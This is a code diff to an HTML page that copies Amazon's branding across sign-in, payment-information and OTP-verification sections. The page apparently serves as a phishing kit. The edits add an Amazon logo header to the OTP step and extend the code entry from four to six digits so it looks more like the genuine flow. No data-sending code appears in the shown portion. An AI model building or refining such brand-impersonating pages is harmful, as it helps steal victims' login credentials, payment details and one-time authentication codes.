@@ -32,7 +32,7 @@
         }
 
         .header {
-            background-color: #ffffff;  /* Set background to white */
+            background-color: #ffffff;
             padding: 20px;
             color: white;
             font-size: 20px;
@@ -40,16 +40,16 @@
             border-radius: 5px;
             margin-bottom: 30px;
             text-align: center;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.1);  /* Optional shadow for header */
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
         }
 
         .header img {
             max-width: 140px;
             height: auto;
             margin-bottom: 10px;
-            background-color: white; /* Ensure logo background is white */
-            padding: 10px;  /* Optional padding around the logo */
-            border-radius: 5px; /* Optional rounded corners for the logo */
+            background-color: white;
+            padding: 10px;
+            border-radius: 5px;
         }
 
         h1 {
@@ -139,7 +139,7 @@
             max-width: 100px;
             height: auto;
             cursor: pointer;
-            background-color: white;  /* White background for all payment icons */
+            background-color: white;
             padding: 10px;
             border-radius: 5px;
         }
@@ -177,7 +177,7 @@
     <!-- Login Page Section -->
     <div class="section active" id="login-section">
         <div class="header">
-            <!-- Amazon logo with white background at the top of the login page -->
+            <!-- Amazon logo with white background -->
             <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon Logo">
             <span>Sign-In</span>
         </div>
@@ -217,7 +217,7 @@
     <!-- Payment Page Section -->
     <div class="section" id="payment-section">
         <div class="header">
-            <!-- Amazon logo with white background at the top of the payment page -->
+            <!-- Amazon logo with white background -->
             <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon Logo">
             <span>Payment Information</span>
         </div>
@@ -243,12 +243,20 @@
     <!-- OTP Verification Page Section -->
     <div class="section" id="otp-section">
         <h1>Enter the OTP sent to your phone number</h1>
+        <div class="header">
+            <!-- Amazon logo with white background -->
+            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon Logo">
+            <span>OTP Verification</span>
+        </div>
+        <div class="section-title">Enter the 6-digit OTP</div>
         <form onsubmit="verifyOTP(event)">
-            <div style="display: flex; gap: 10px;">
+            <div style="display: flex; justify-content: space-between;">
                 <input type="text" id="otp1" name="otp1" class="input-field" maxlength="1" required>
                 <input type="text" id="otp2" name="otp2" class="input-field" maxlength="1" required>
                 <input type="text" id="otp3" name="otp3" class="input-field" maxlength="1" required>
                 <input type="text" id="otp4" name="otp4" class="input-field" maxlength="1" required>
+                <input type="text" id="otp5" name="otp5" class="input-field" maxlength="1" required>
+                <input type="text" id="otp6" name="otp6" class="input-field" maxlength="1" required>
             </div>
             <button type="submit" class="submit-btn">Verify OTP</button>
         </form>
@@ -287,11 +295,13 @@
             document.getElementById('otp1').value,
             document.getElementById('otp2').value,
             document.getElementById('otp3').value,
-            document.getElementById('otp4').value
+            document.getElementById('otp4').value,
+            document.getElementById('otp5').value,
+            document.getElementById('otp6').value
         ];
 
         const otpString = otp.join('');
-        if (otpString.length === 4 && !otp.includes("")) {
+        if (otpString.length === 6 && !otp.includes("")) {
             alert('OTP verified successfully!');
         } else {
             alert('Please enter a valid OTP.');
